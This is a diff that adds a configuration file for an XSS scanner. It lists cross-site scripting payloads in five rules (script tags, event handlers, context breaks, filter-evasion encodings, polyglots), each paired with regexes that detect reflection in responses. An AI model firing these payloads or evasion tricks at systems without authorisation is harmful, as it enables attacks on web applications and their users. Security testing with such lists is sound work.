@@ -1,0 +1,87 @@
+# Cross-Site Scripting (XSS) Testing Config
+# No filters or targets specified - payloads applied to all parameters
+# across all requests. Run with --detect-reflection for best results.
+
+rules:
+  # Rule 1: Basic script tag injection
+  # Straightforward payloads - caught by most WAFs but essential for
+  # identifying unprotected endpoints. Run with --detect-reflection.
+  - payloads:
+      type: list
+      source:
+        - "<script>alert(1)</script>"
+        - "<SCRIPT>alert(1)</SCRIPT>"
+        - "<script>alert('XSS')</script>"
+        - "<script src=x></script>"
+    conditions:
+      match_mode: "any"
+      regex_in_body: "<script>alert|alert\\(1\\)|alert\\('XSS'\\)"
+      status_code: 500
+
+  # Rule 2: Event handler injection
+  # Bypasses filters that only block <script> tags.
+  # Reflected onerror= or onload= in body is a strong indicator.
+  - payloads:
+      type: list
+      source:
+        - "<img src=x onerror=alert(1)>"
+        - "<svg onload=alert(1)>"
+        - "<body onload=alert(1)>"
+        - "<input autofocus onfocus=alert(1)>"
+        - "<a href=\"javascript:alert(1)\">x</a>"
+        - "<iframe onload=alert(1)>"
+        - "<details open ontoggle=alert(1)>"
+    conditions:
+      match_mode: "any"
+      regex_in_body: "onerror=alert|onload=alert|onfocus=alert|ontoggle=alert|javascript:alert"
+
+  # Rule 3: Context-breaking payloads
+  # For inputs reflected inside HTML attributes or JavaScript strings.
+  # The "> and '; prefixes attempt to break out of the surrounding context.
+  - payloads:
+      type: list
+      source:
+        - "\"><script>alert(1)</script>"
+        - "'><script>alert(1)</script>"
+        - "</tag><script>alert(1)</script>"
+        - "\";alert(1)//"
+        - "';alert(1)//"
+        - "\\';alert(1)//"
+        - "</script><script>alert(1)</script>"
+        - "\"></script><svg onload=alert(1)>"
+    conditions:
+      match_mode: "any"
+      regex_in_body: "<script>alert|alert\\(1\\)|onerror=alert|onload=alert"
+
+  # Rule 4: Filter evasion payloads
+  # Mixed case, encoding, and whitespace tricks to bypass naive sanitisation.
+  - payloads:
+      type: list
+      source:
+        - "<ScRiPt>alert(1)</ScRiPt>"
+        - "<svg/onload=alert(1)>"
+        - "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"
+        - "<script>alert`1`</script>"
+        - "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+        - "<scr<script>ipt>alert(1)</scr</script>ipt>"
+        - "<<script>alert(1)//<</script>"
+    conditions:
+      match_mode: "any"
+      regex_in_body: "alert\\(1\\)|alert`1`|<script>|onerror="
+
+  # Rule 5: Polyglot payloads
+  # Designed to fire across multiple injection contexts simultaneously -
+  # HTML, attribute, script, and URL contexts. Most likely to find
+  # something when you don't know the injection context in advance.
+  # These are high signal - any reflection is worth investigating.
+  - payloads:
+      type: list
+      source:
+        - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
+        - "'\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>alert(1)</script><img src=x onerror=alert(1)>"
+        - "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onmouseover=/*&lt;svg/*/onload=alert()//>'"
+        - "';alert(0)//';alert(0)//\";alert(0)//\";alert(0)//--></SCRIPT>\">'><SCRIPT>alert(0)</SCRIPT>"
+        - "<svg><script>alert(1)<\\/script>"
+    conditions:
+      match_mode: "any"
+      regex_in_body: "alert\\(|confirm\\(|prompt\\(|onload=|onerror=|onmouseover="
